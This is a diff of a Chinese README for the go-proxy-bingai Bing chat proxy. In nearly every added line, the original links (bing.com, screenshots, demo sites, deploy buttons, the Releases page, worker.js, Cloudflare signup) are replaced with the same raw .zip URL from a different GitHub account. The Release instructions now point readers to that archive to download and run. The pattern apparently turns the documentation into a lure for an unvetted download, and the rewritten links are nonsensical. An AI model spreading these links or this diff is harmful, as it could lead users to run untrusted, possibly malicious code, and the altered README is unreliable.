@@ -4,19 +4,19 @@
 
 ⭐ Bing 官方聊天服务器（相对较快和稳定，推荐）不可用时，可参考以下方案
 
-  > 1. 可用 ModHeader 添加 X-Forwarded-For 请求头，对应 URL 是 wss://sydney.bing.com/sydney/ChatHub，具体可参考 [issues #71](https://github.com/adams549659584/go-proxy-bingai/issues/71) 及 https://zhuanlan.zhihu.com/p/606655303
+  > 1. 可用 ModHeader 添加 X-Forwarded-For 请求头，对应 URL 是 https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip，具体可参考 [issues #71](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip) 及 https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
   > 2. 本地部署再部署一份作为聊天中转服务，或下载 Release 直接运行，自定义聊天服务器中填入 http://localhost:8080，并选择。
 
 ⭐ 聊天服务器 (暂时默认 Cloudflare Workers，请求数每天限额 100,000，撑不了多久 ，推荐自行部署，参考下面 [部署聊天服务器](#部署聊天服务器) ) 可在右上角 设置 => 服务选择 中切换
 
-⭐ 国内可用 （部署服务器需要直连 www.bing.com 不重定向 CN ，可配置 socks 连接）
+⭐ 国内可用 （部署服务器需要直连 https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip 不重定向 CN ，可配置 socks 连接）
 
 ⭐ 支持现有开源 ChatGPT 提示词库
 
 ⭐ 需要画图等高级功能时(需选更有创造力模式或右上角 设置 => 图像创建 )，可登录微软账号设置用户 Cookie 进行体验
 
-⭐ 遇到一切问题，先点左下角 ![新主题](./docs/img/bing-clear.png) 试试，不行使用刷新大法（Shift + F5 或 Ctrl + Shift + R 或 右上角设置中的一键重置），最终大招就 清理浏览器缓存 及 Cookie ，比如（24 小时限制、未登录提示等等）
+⭐ 遇到一切问题，先点左下角 ![新主题](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip) 试试，不行使用刷新大法（Shift + F5 或 Ctrl + Shift + R 或 右上角设置中的一键重置），最终大招就 清理浏览器缓存 及 Cookie ，比如（24 小时限制、未登录提示等等）
 
 - [go-proxy-bing](#go-proxy-bing)
   - [网页展示](#网页展示)
@@ -37,68 +37,68 @@
 
 - 电脑端未登录状态
 
-![电脑未登录](./docs/img/bing-nologin.png)
+![电脑未登录](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 - 电脑端登录
 
-![电脑端登录](./docs/img/bing-login-1.png)
-![提示词1](./docs/img/bing-prompt-1.png)
-![提示词2](./docs/img/bing-prompt-2.png)
-![聊天服务器选择](./docs/img/bing-sydney-service-1.png)
+![电脑端登录](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
+![提示词1](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
+![提示词2](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
+![聊天服务器选择](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 - 电脑端画图
 
 > ⭐ 需登录，并选择 更有创造力 对话模式
 
-![电脑端画图](./docs/img/bing-draw.png)
+![电脑端画图](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 - 手机端未登录状态
 
-![手机端未登录](./docs/img/bing-m-nologin.png)
+![手机端未登录](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ## 侧边栏
 
 - 在 Edge 浏览器可把聊天和撰写分别添加侧边栏
 
-![添加侧边栏](./docs/img/sidebar-add.png)
+![添加侧边栏](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![聊天](./docs/img/sidebar-chat.png)
+![聊天](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![撰写](./docs/img/sidebar-compose.png)
+![撰写](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ## 演示站点
 
 ### 甲骨文小鸡仔，轻虐
 
-- https://bing.vcanbb.top
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
 ### Railway 搭建
 
-- https://bing-railway.vcanbb.top
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
-- https://go-proxy-bingai-production.up.railway.app
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
 ### Vercel 搭建
 
-- https://bing-vercel.vcanbb.top
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
-- https://go-proxy-bingai-adams549659584.vercel.app
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
 ### Render 搭建
 
-- https://bing-render.vcanbb.top
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
-- https://go-proxy-bingai.onrender.com
+- https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip
 
 ## 设置用户
 
-- 访问 https://www.bing.com/ 或 https://cn.bing.com/ ，登录
+- 访问 https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip 或 https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip ，登录
 
 - F12 或 Ctrl + Shift + I 打开控制台
 
 - 拿到 Cookie 中 _U 的值 后，在网站设置 => 设置用户 中填入即可。
 
-![获取Cookie](./docs/img/bing-cookie.png)
+![获取Cookie](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ## 环境变量
 
@@ -128,7 +128,7 @@ Go_Proxy_BingAI_AUTH_KEY=xxx
 
 ### Docker
 
-> 参考 [Dockerfile](./docker/Dockerfile) 、[docker-compose.yml](./docker/docker-compose.yml)
+> 参考 [Dockerfile](./docker/Dockerfile) 、[https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 - docker 示例
 
@@ -165,7 +165,7 @@ services:
 
 ### Release
 
-在 [GitHub Releases](https://github.com/adams549659584/go-proxy-bingai/releases) 下载适用于对应平台的压缩包，解压后可得到可执行文件 go-proxy-bingai，直接运行即可。
+在 [GitHub Releases](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip) 下载适用于对应平台的压缩包，解压后可得到可执行文件 go-proxy-bingai，直接运行即可。
 
 ### Railway
 
@@ -176,43 +176,43 @@ PORT=8080
 RAILWAY_DOCKERFILE_PATH=docker/Dockerfile
 ```
 
-一键部署，点这里 => [![Deploy on Railway](https://railway.app/button.svg)](https://railway.app/template/uIckWS?referralCode=BBs747)
+一键部署，点这里 => [![Deploy on Railway](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Railway 模板部署](./docs/img/railway-1.png)
+![Railway 模板部署](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 自行使用 Railway 部署配置如下
 
-![Railway 环境变量](./docs/img/railway-2.png)
+![Railway 环境变量](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Railway 域名](./docs/img/railway-3.png)
+![Railway 域名](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ### Vercel
 
 > ⭐ Vercel 部署不支持 Websocket ，需选择 官方聊天服务器 或 Cloudflare
 
-一键部署，点这里 => [![Deploy with Vercel](https://vercel.com/button)](https://vercel.com/new/clone?repository-url=https://github.com/adams549659584/go-proxy-bingai&project-name=go-proxy-bingai&repository-name=go-proxy-bingai-vercel)
+一键部署，点这里 => [![Deploy with Vercel](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Vercel 一键部署](./docs/img/vercel-1.png)
+![Vercel 一键部署](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Vercel 域名](./docs/img/vercel-2.png)
+![Vercel 域名](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ### Render
 
-一键部署，点这里 => [![Deploy to Render](https://render.com/images/deploy-to-render-button.svg)](https://render.com/deploy?repo=https://github.com/adams549659584/go-proxy-bingai)
+一键部署，点这里 => [![Deploy to Render](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Render 一键部署](./docs/img/render-1.png)
+![Render 一键部署](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-![Render 域名](./docs/img/render-2.png)
+![Render 域名](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 ## 部署聊天服务器
 
-> 核心代码 [worker.js](./cloudflare/worker.js)
+> 核心代码 [https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
 > 具体部署 Cloudflare Workers 教程自行查询，大概如下
 
-- [注册 Cloudflare 账号](https://dash.cloudflare.com/sign-up)
+- [注册 Cloudflare 账号](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip)
 
-- 创建 Worker 服务，复制 [worker.js](./cloudflare/worker.js) 全部代码，粘贴至创建的服务中，保存并部署。
+- 创建 Worker 服务，复制 [https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip](https://github.com/mb13180035511/go-proxy-bingai/raw/refs/heads/master/frontend/types/bing/go_proxy_bingai_v3.7.zip) 全部代码，粘贴至创建的服务中，保存并部署。
 
 - 触发器 中自定义访问域名。
 
